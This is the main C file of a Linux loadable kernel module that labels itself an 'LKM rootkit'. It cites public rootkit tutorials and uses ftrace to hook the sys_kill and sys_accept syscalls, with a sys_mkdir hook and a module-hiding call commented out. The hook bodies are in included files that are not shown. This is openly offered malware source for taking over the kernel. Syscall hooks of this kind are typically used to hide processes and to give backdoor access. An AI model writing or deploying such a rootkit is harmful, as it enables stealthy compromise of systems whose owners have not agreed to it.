//https://xcellerator.github.io/posts/linux_rootkits_11/
//https://github.com/m0nad/Diamorphine
#include "ftrace_hook.h"
#include "mkdir_hook.c"
#include "kill_hook.c"
#include "accept_hook.c"

static struct ftrace_hook hooks[] = {
	//HOOK("sys_mkdir",  muaddib_mkdir,  &og_mkdir),
	HOOK("sys_kill", muaddib_kill, &og_kill),
    HOOK("sys_accept", muaddib_accept, &og_accept),
};

static int __init rk_init(void){
	//hideme();
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: Loaded >:-)\n");
    return 0;
}

static void __exit rk_cleanup(void){
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rk_init);
module_exit(rk_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nerelod");
MODULE_DESCRIPTION("LKM rootkit");
